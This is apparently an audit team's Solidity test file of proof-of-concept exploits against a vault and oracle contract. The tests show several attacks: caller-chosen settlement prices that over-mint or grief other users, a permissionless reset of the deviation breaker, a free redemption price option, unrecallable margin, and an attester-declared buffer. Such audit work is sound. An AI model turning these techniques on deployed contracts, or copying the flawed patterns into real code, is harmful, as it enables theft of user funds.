// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {VaultFixture} from "./helpers/VaultFixture.sol";
import {CertVault} from "../src/CertVault.sol";
import {CertOracle} from "../src/CertOracle.sol";

/// @notice Proof-of-concept exploits written during the C1 backend audit (2026-09-08).
///         Each test FAILS the property it names under the current code. They are written to
///         demonstrate, not to be merged green — see the audit report.
contract AuditPoCTest is VaultFixture {
    address internal attacker = makeAddr("attacker");
    address internal stranger = makeAddr("stranger");

    function _maxNotional() internal view returns (uint256) {
        return cap.maxNotional18(address(vault), book.capacity18(address(vault)));
    }

    // ------------------------------------------------------------------ A-1
    // _requireCapacity measures "current" as the ATTESTED notional, which does not move between
    // batches. Every mint in the same batch therefore re-uses the same headroom.

    function test_A1_capacityCapIsPerCallNotCumulative() public {
        uint256 max = _maxNotional();
        emit log_named_decimal_uint("maxNotional18", max, 18);

        // Each mintInstant stays under instantCap18 (10_000e18) and under maxNotional on its own.
        uint256 perMint = 10_000e6; // ~9_990e18 notional after the 10bps fee
        usdg.mint(alice, 1_000_000e6);

        vm.startPrank(alice);
        for (uint256 i = 0; i < 20; i++) {
            vault.mintInstant(perMint);
        }
        vm.stopPrank();

        uint256 mintedNotional = cert.totalSupply() * PX / 1e18;
        emit log_named_decimal_uint("mintedNotional18", mintedNotional, 18);

        // The attestation never moved, so the cap never tightened.
        assertEq(_maxNotional(), max, "cap moved");
        assertLt(mintedNotional, max, "PROPERTY: minted notional must respect maxNotional");
    }

    // ------------------------------------------------------------------ A-2
    // settleMint takes fillPx18 from the caller and only bands it against requestPx18. Anyone may
    // call it, so the price is chosen by whoever calls first.

    function test_A2_settleMintCallerPicksPriceInBandAndOverMints() public {
        vm.prank(alice);
        uint256 id = vault.requestMint(50_000e6);

        (, uint256 escrow,, uint256 requestPx,,, uint256 indicativeCerts) = vault.mintReceipts(id);
        emit log_named_decimal_uint("hedged (indicativeCerts)", indicativeCerts, 18);

        // 5% below the request price is exactly on the settleBandBps=500 edge, so it passes.
        uint256 favourable = requestPx * 95 / 100;

        vm.prank(attacker); // NOT the receipt owner
        vault.settleMint(id, favourable);

        uint256 minted = cert.totalSupply();
        emit log_named_decimal_uint("minted certificates", minted, 18);
        emit log_named_decimal_uint("unhedged excess    ", minted - indicativeCerts, 18);
        emit log_named_decimal_uint("value of excess $  ", (minted - indicativeCerts) * PX / 1e18, 18);
        escrow;

        assertLe(minted, indicativeCerts, "PROPERTY: settle must not mint more than was hedged");
    }

    function test_A2b_strangerCanGriefAReceiptByPickingTheWorstPrice() public {
        vm.prank(alice);
        uint256 id = vault.requestMint(50_000e6);
        (,,, uint256 requestPx,,, uint256 indicativeCerts) = vault.mintReceipts(id);

        // A stranger front-runs the honest settle with the top of the band.
        uint256 punitive = requestPx * 105 / 100;
        vm.prank(stranger);
        vault.settleMint(id, punitive);

        uint256 got = cert.balanceOf(alice);
        emit log_named_decimal_uint("alice should have ~", indicativeCerts, 18);
        emit log_named_decimal_uint("alice actually got ", got, 18);
        emit log_named_decimal_uint("value destroyed $  ", (indicativeCerts - got) * PX / 1e18, 18);

        assertGe(got, indicativeCerts, "PROPERTY: a stranger must not be able to shrink alice's mint");
    }

    // ------------------------------------------------------------------ A-3
    // pokeLastGood() is permissionless and resets the reference the deviation breaker measures
    // against, so the breaker can always be cleared by the party it is meant to stop.

    function test_A3_pokeLastGoodDefeatsTheDeviationBreaker() public {
        assertTrue(oracle.mintAllowed(), "precondition: minting open");

        // A genuine 6% move. Feed and venue mark move together, so the basis band is satisfied;
        // only the deviation breaker (500 bps) should be holding minting shut.
        _setPrice(PX * 106 / 100);
        assertFalse(oracle.mintAllowed(), "precondition: deviation breaker tripped");

        // Anybody. No key, no role, no delay.
        vm.prank(attacker);
        oracle.pokeLastGood();

        emit log_named_string("after a permissionless poke, mintAllowed =", oracle.mintAllowed() ? "true" : "false");

        vm.prank(alice);
        vault.mintInstant(10_000e6); // succeeds

        assertFalse(oracle.mintAllowed(), "PROPERTY: the breaker must not be clearable by its target");
    }

    // ------------------------------------------------------------------ A-4
    // A queued exit fixes the payout at the request-time price. Mints settle at the fill price;
    // redemptions do not, so the holder holds a free option over the batch latency.

    function test_A4_queuedRedeemLocksThePriceAndGivesHolderAFreeOption() public {
        vm.prank(alice);
        vault.mintInstant(10_000e6);
        uint256 certs = cert.balanceOf(alice);

        vm.prank(alice);
        uint256 id = vault.requestRedeem(certs);
        (, uint256 owed18,,,) = vault.redeemReceipts(id);

        // Price gaps down 30% before the close can fill in the next batch.
        _setPrice(PX * 70 / 100);

        vm.prank(alice);
        uint256 paid = vault.claimRedeem(id);

        uint256 worthNow = _fromE18(certs * (PX * 70 / 100) / 1e18);
        emit log_named_decimal_uint("paid out (USDG)      ", paid, 6);
        emit log_named_decimal_uint("certs worth now(USDG)", worthNow, 6);
        emit log_named_decimal_uint("vault loss (USDG)    ", paid - worthNow, 6);
        owed18;

        assertLe(paid, worthNow, "PROPERTY: a redemption must not pay above the value it closes at");
    }

    // ------------------------------------------------------------------ A-5
    // After instant redemptions there is no permissionless way to bring the freed venue margin
    // home: recallMargin() sizes off two counters that instant redemption never touches.

    function test_A5_recallMarginCannotRefillTheBufferAfterInstantRedeems() public {
        vm.prank(alice);
        vault.mintInstant(10_000e6);
        uint256 certs = cert.balanceOf(alice);

        uint256 postedBefore = vault.postedMargin();

        vm.prank(alice);
        vault.redeemInstant(certs); // hedge closed, supply back to 0

        _drainHotBuffer(); // the float is spent

        assertEq(vault.marginPendingRecall(), 0, "instant redeem allocated nothing");
        assertEq(vault.totalOwedOutstanding(), 0, "instant redeem owes nothing");

        vm.prank(stranger);
        vault.recallMargin(); // permissionless, and a no-op

        emit log_named_decimal_uint("postedMargin still at venue", vault.postedMargin(), 6);
        emit log_named_decimal_uint("hotBuffer after recall     ", vault.hotBuffer(), 6);
        postedBefore;

        assertGt(vault.hotBuffer(), 0, "PROPERTY: margin must be recallable without a queued receipt");
    }


    // ------------------------------------------------------------------ A-6
    // Law 1 measured against VENUE GROUND TRUTH, not against the vault's own arithmetic:
    // after the hedge has actually filled, the position the venue holds is smaller than the
    // certificates outstanding demand. This is the invariant the suite never asserts.

    function test_A6_lawOneBreachedAgainstVenueGroundTruth() public {
        vm.prank(alice);
        uint256 id = vault.requestMint(50_000e6);
        (,,, uint256 requestPx,,,) = vault.mintReceipts(id);

        vm.prank(attacker);
        vault.settleMint(id, requestPx * 95 / 100); // caller-chosen, in band

        lighter.settleBatch(); // the hedge actually fills

        uint256 supply = cert.totalSupply();
        uint256 required18 = supply * PX / 1e18;

        int256 pos = lighter.positionBase(MARKET);
        uint256 heldNotional18 = uint256(pos > 0 ? pos : -pos) * lighter.markPrice(MARKET) / (10 ** 4);

        emit log_named_decimal_uint("certificates outstanding demand $", required18, 18);
        emit log_named_decimal_uint("venue position actually holds   $", heldNotional18, 18);
        emit log_named_decimal_uint("UNBACKED                        $", required18 - heldNotional18, 18);

        assertGe(heldNotional18, required18, "LAW 1: backing must cover supply x px");
    }


    // ------------------------------------------------------------------ A-7
    // The published buffer figure is an accounting number with no relationship to the collateral
    // the vault actually holds, and the oracle attester can set it to anything.

    function test_A7_publishedBufferIsNotBackedByAnything() public {
        uint256 hotStart = vault.hotBuffer();
        int256 bookStart = vault.solvency().buffer18;
        emit log_named_decimal_uint("hotBuffer (real USDG)", hotStart, 6);
        emit log_named_int("BufferBook (published)", bookStart);

        // Ordinary operation: fees in, instant redemption out. Neither touches BufferBook.
        vm.startPrank(alice);
        vault.mintInstant(10_000e6);
        vault.redeemInstant(cert.balanceOf(alice));
        vm.stopPrank();

        emit log_named_decimal_uint("hotBuffer after ops  ", vault.hotBuffer(), 6);
        emit log_named_int("BufferBook after ops  ", vault.solvency().buffer18);

        // And the attester can simply declare a buffer.
        vm.prank(attester);
        vault.accrueFunding(500_000_000e18);
        emit log_named_int("BufferBook after attester declares 500m", vault.solvency().buffer18);
        emit log_named_decimal_uint("hotBuffer (unchanged)", vault.hotBuffer(), 6);

        assertEq(
            uint256(vault.solvency().buffer18) / 1e12,
            vault.hotBuffer(),
            "PROPERTY: published buffer should reflect collateral actually held"
        );
    }

    function _fromE18(uint256 a) internal pure returns (uint256) {
        return a / 1e12; // 6-decimal collateral
    }
}
